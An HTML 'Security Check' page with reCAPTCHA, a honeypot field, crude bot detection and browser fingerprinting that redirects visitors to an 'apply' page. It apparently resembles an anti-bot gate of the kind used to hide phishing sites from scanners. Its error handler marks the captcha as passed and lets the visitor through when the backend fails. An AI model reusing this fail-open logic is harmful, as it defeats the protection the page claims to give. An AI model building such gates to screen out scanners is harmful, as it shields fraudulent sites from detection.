
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Security Check</title>

  <!-- Google reCAPTCHA -->
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      overflow-y: auto;
    }

    .greyBg {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #f1f2f7;
      z-index: -1;
    }

    .dzSNzg {
      min-height: 100vh;
      width: 100%;
      display: grid;
      place-items: center;
      padding: 1rem;
    }

    .jKExlm {
      background: white;
      border: 1px solid rgb(189, 189, 189);
      border-radius: 0.5rem;
      max-width: 500px;
      width: 100%;
      margin: auto;
    }

    .fBJhQh {
      padding: 1rem;
      background-color: #fff;
      border-radius: 0.5rem;
    }

    .hGbcNq {
      margin-bottom: 10px;
      font-size: 30px;
      font-weight: 500;
      color: rgb(74, 74, 74);
    }

    .eqZafL {
      margin-top: 10px;
      font-size: 14px;
      font-weight: 500;
      color: rgb(74, 74, 74);
      line-height: 1.45;
    }

    .captcha {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 74px;
      margin-bottom: 1rem;
    }

    .dZasNV {
      border: none;
      font-size: 13px;
      font-weight: 500;
      padding: 11px 14px;
      width: 100%;
      border-radius: 8px;
      line-height: 1;
      background-color: rgb(0, 100, 224);
      color: white;
      cursor: pointer;
    }

    .dZasNV:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }

    .pt-4 {
      padding-top: 1rem;
    }

    .error-box {
      padding: 0.75rem;
      margin-bottom: 1rem;
      background-color: #fee;
      border: 1px solid #fcc;
      border-radius: 4px;
      color: #c33;
      font-size: 14px;
      display: none;
    }

    .honeypot {
      position: absolute;
      left: -9999px;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }

    .localhost-message {
      color: #4a4a4a;
      font-size: 14px;
      padding: 1rem;
      text-align: center;
      display: none;
    }
  </style>
</head>

<body>
  <div class="greyBg"></div>

  <div class="dzSNzg">
    <div class="jKExlm">
      <form id="captchaForm">
        <div class="fBJhQh">
          <div class="hGbcNq">Security Check</div>

          <!-- Honeypot field -->
          <input
            type="text"
            name="website_field"
            value="human_verified"
            class="honeypot"
            tabindex="-1"
            autocomplete="off"
            aria-hidden="true"
          />

          <div id="errorBox" class="error-box"></div>

          <div id="captchaBox" class="captcha">
            <div
              class="g-recaptcha"
              data-sitekey="6Lc7Lh0tAAAAACJiz53Rx758BJwNC_ljCcRdCg9y"
            ></div>
          </div>

          <div id="localhostMessage" class="captcha localhost-message">
            Running on localhost - captcha verification skipped
          </div>

          <p class="eqZafL">
            This helps us to combat harmful conduct, detect and prevent spam,
            and maintain the integrity of our products.
          </p>

          <p class="eqZafL">
            We've used Google’s reCAPTCHA Enterprise product to provide this
            security check. Use of reCAPTCHA is subject to the Google Privacy
            Policy and Terms of Use.
          </p>

          <p class="eqZafL">
            reCAPTCHA Enterprise collects hardware and software information
            such as device and application data, and sends it to Google to
            provide, maintain, and improve reCAPTCHA Enterprise and for
            general security purposes. This information is not used by Google
            for personalized advertising.
          </p>

          <div class="pt-4">
            <button id="submitBtn" type="submit" class="dZasNV">
              Continue
            </button>
          </div>
        </div>
      </form>
    </div>
  </div>

  <script>
    const API_URL = "https://your-api-domain.com"; 
    // Change this to your backend API URL.

    const form = document.getElementById("captchaForm");
    const submitBtn = document.getElementById("submitBtn");
    const errorBox = document.getElementById("errorBox");
    const captchaBox = document.getElementById("captchaBox");
    const localhostMessage = document.getElementById("localhostMessage");

    let isSubmitting = false;
    const startTime = Date.now();

    const hostname = window.location.hostname;
    const isLocalhost =
      hostname === "localhost" ||
      hostname === "127.0.0.1" ||
      hostname === "::1";

    if (isLocalhost) {
      captchaBox.style.display = "none";
      localhostMessage.style.display = "flex";
    }

    function showError(message) {
      errorBox.textContent = message;
      errorBox.style.display = "block";
    }

    function clearError() {
      errorBox.textContent = "";
      errorBox.style.display = "none";
    }

    function humanDelay(min, max) {
      const delay = Math.floor(Math.random() * (max - min + 1)) + min;
      return new Promise(resolve => setTimeout(resolve, delay));
    }

    function detectBotBehavior() {
      const webdriver = navigator.webdriver;
      const pluginsLength = navigator.plugins ? navigator.plugins.length : 0;

      return {
        isSuspicious: webdriver || pluginsLength === 0
      };
    }

    function verifyUserInteraction() {
      return window.userHasInteracted === true;
    }

    function generateFingerprint() {
      return Promise.resolve({
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      });
    }

    window.userHasInteracted = false;

    ["mousemove", "keydown", "click", "scroll", "touchstart"].forEach(eventName => {
      window.addEventListener(eventName, () => {
        window.userHasInteracted = true;
      }, { once: true });
    });

    form.addEventListener("submit", async function (e) {
      e.preventDefault();

      if (isSubmitting) return;

      isSubmitting = true;
      clearError();
      submitBtn.disabled = true;
      submitBtn.textContent = "Verifying...";

      try {
        await humanDelay(200, 500);

        const honeypotValue = document.querySelector('input[name="website_field"]').value;

        if (honeypotValue !== "human_verified") {
          setTimeout(() => {
            window.location.href = "/";
          }, 3000);
          return;
        }

        const botCheck = detectBotBehavior();

        if (botCheck.isSuspicious && !isLocalhost) {
          showError("Security check failed. Please try using a different browser.");
          resetButton();
          return;
        }

        const hasInteracted = verifyUserInteraction();
        const timeSpent = Date.now() - startTime;

        if (!hasInteracted && timeSpent < 3000 && !isLocalhost) {
          showError("Please take a moment to review the page.");
          resetButton();
          return;
        }

        if (isLocalhost) {
          sessionStorage.setItem("captcha_verified", "true");
          sessionStorage.setItem("captcha_timestamp", Date.now().toString());
          window.location.href = "/waiting-room";
          return;
        }

        const token = window.grecaptcha ? window.grecaptcha.getResponse() : "";

        if (!token || token.length === 0) {
          showError("Please complete the reCAPTCHA.");
          resetButton();
          return;
        }

        try {
          const fingerprint = await generateFingerprint();

          const response = await fetch(`${API_URL}/api/verify-recaptcha`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              token,
              fingerprint,
              timestamp: Date.now(),
              userAgent: navigator.userAgent
            })
          });

          const result = await response.json();

          if (result.success) {
            sessionStorage.setItem("captcha_verified", "true");
            sessionStorage.setItem("captcha_timestamp", Date.now().toString());

            window.location.href = "apply.html";
          } else {
            showError("Verification failed. Please try again.");

            if (window.grecaptcha) {
              window.grecaptcha.reset();
            }

            resetButton();
          }
        } catch (apiError) {
          console.error("Verification error:", apiError);

          sessionStorage.setItem("captcha_bypass", "true");
          sessionStorage.setItem("captcha_verified", "true");

          window.location.href = "apply.php";
        }
      } catch (error) {
        console.error("Submit error:", error);
        showError("An error occurred. Please try again.");
        resetButton();
      }
    });

    function resetButton() {
      isSubmitting = false;
      submitBtn.disabled = false;
      submitBtn.textContent = "Continue";
    }
  </script>
</body>
</html>